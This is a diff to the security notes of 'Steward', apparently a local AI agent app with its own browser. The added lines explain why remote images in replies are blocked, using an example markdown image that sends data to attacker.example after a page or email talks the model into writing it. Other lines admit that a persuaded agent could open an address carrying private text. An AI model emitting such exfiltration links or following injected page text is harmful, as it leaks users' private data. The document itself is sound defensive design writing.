@@ -57,6 +57,12 @@ Steward has no sign-in. Anyone who can reach its port can use it as you. So:
   WebSocket upgrades are checked the same way, because browsers do not apply CORS to them.
 - **Its pages cannot be framed.** `X-Frame-Options: DENY` and `frame-ancestors 'none'`, so no other
   site can lay an invisible approval card under your cursor.
+- **Replies cannot load images from elsewhere.** A reply that a page or an email talked the model
+  into ending with `![](https://attacker.example/?d=...)` would leak data the moment it is drawn,
+  with no tool call to stop. The chat does not load remote images in replies (it shows the address
+  as text), and the server's content policy allows images only from Steward itself (`img-src
+  'self' data: blob:`).
+- **The demo inbox refuses writes from other sites,** so a page you visit cannot plant mail in it.
 - **Request bodies are size-limited.**
 
 If you want to reach Steward from another device, put it behind something that authenticates you
@@ -192,7 +198,8 @@ Plainly, so nobody relies on something that is not there:
   is spelled out, split up or encoded.
 - **Data in addresses and form fields on the agent's own browser.** Opening a page and typing into
   a field are actions on Steward's own browser, and they run without asking, even in a tainted
-  conversation, unless they commit something (a click named like Send or Pay, Enter in a form).
+  conversation, unless they commit something (a click, Enter or Space on a control named like Send
+  or Pay, or a submit whose form's default button is).
   A page that persuaded the agent could have it open an address with private text in it. The
   outbound check looks for keys and passwords in addresses, and for card numbers, IBANs and ID
   numbers in what is typed, but not for every private detail. Watch the computer panel and the
